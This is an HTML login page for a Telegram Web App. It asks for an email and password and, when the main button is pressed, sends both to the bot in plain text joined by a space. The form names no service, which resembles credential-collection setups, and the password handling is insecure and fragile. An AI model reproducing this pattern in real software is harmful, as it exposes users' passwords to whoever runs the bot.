<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Authorization</title>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/css/bootstrap.min.css">
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    .text {
      color: var(--tg-theme-text-color);
    }
    .bg {
      background-color: var(--tg-theme-bg-color);
    }
    .hint {
      color: var(--tg-theme-hint-color);
    }
    .tg-input {
      color: var(--tg-theme-secondary-bg-color);
    }
  </style>
</head>
<body>
  <div class="text-white bg" style="position: absolute; top: 0; right: 0; bottom: 0; left: 0;">
    <div class="card-body p-5 text-center">

      <div class="mb-md-5 mt-md-4 pb-5">

        <h2 class="fw-bold mb-2 text-uppercase text">Login</h2>
        <p class="mb-5 hint">Please enter your email and password!</p>

        <div class="form-outline form-white mb-4">
          <input type="email" id="typeEmailX" class="form-control form-control-lg tg-input" />
          <label class="form-label text" for="typeEmailX">Email</label>
        </div>

        <div class="form-outline form-white mb-4">
          <input type="password" id="typePasswordX" class="form-control form-control-lg tg-input" />
          <label class="form-labe text" for="typePasswordX">Password</label>
        </div>

      </div>
    </div>
  </div>
</body>
<script>
  let tg = window.Telegram.WebApp;
  tg.MainButton.show()

  Telegram.WebApp.onEvent('mainButtonClicked', function(){
    let email = document.getElementById("typeEmailX").value;
    let pass = document.getElementById("typePasswordX").value;

    tg.sendData(email + " " + pass);
  });
</script>
</html>
